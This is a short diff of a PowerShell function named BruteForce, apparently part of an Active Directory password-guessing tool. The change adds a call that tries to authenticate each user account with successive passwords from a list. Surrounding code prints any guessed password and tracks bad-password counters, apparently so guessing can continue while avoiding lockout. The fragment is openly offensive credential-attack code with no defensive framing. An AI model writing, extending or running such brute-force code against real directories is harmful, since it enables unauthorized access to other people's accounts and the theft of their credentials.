@@ -349,8 +349,12 @@ Function BruteForce
                         {
                             # Verbose-log if $badpwdtime in null. Possible "Cannot index into a null array" error.
                             Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"
-			    
-			    
+	
+	
+	
+				   # Try the auth with current password
+        	                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
+			
                                 If ($auth -eq $true)
                                 {
                                     Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
@@ -364,7 +368,8 @@ Function BruteForce
                                     $numTry[$i] += 1
                                     If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                 }
-			    
+			 
+			 
 			    
                         } # Badpwdtime-check if
 
